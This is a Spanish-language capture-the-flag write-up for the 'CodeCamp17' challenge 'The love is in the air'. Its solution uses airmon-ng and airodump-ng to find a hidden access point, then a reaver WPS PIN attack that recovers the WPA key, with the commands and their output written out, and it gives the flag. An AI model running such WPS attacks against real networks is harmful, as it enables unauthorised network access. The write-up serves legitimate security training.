# The love is in the air

You are the G+*U to my <3

R: **CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}**


Hit: https://youtu.be/fP22QqI32qs?t=7m19s

---------------------------

#Solución

Durante el evento se habilitará un punto de acceso con el ESSID oculto. Haciendo un escaneo se puede ver que existe un AP oculto

```
$ airmon-ng start wlan0
$ airodump-ng mon0
CH 13 ][ Elapsed: 0 s ][ 2017-02-06 00:18
                                                                                                 
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 64:16:F0:E0:6F:CF  -45        5        0    0   1  54e  WPA2 CCMP   PSK  <length:  0>

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
```


Con herramientas como wash es facil darse cuenta que tiene activado WPS. Curiosamente, es posible realizar un ataque sin saber el ESSID del AP. Sin embargo, el proceso va a ser muy lento si no conocemos el PIN. La llave. The key.

G+*U no nos dice nada, ya que buscamos un pin de 8 dígitos numéricos decimales y eso son 4 caracteres ASCII. ¿Y si lo traducimos al decimal?

G+*U -> 71434285

```
$ reaver -i mon0 -b 64:16:F0:E0:6F:CF -vvv -p 71434285

Reaver v1.4-r119 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 64:16:F0:E0:6F:CF
[+] Switching mon0 to channel 1
[+] Associated with 64:16:F0:E0:6F:CF (ESSID: (null))
[+] Trying pin 71434285
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 3 seconds
[+] WPS PIN: '71434285'
[+] WPA PSK: 'CodeCamp17{aHR0cHM6Ly95b3V0dS5iZS9mUUdiWG1rU0Fycwo=}'
[+] AP SSID: 'love'
```
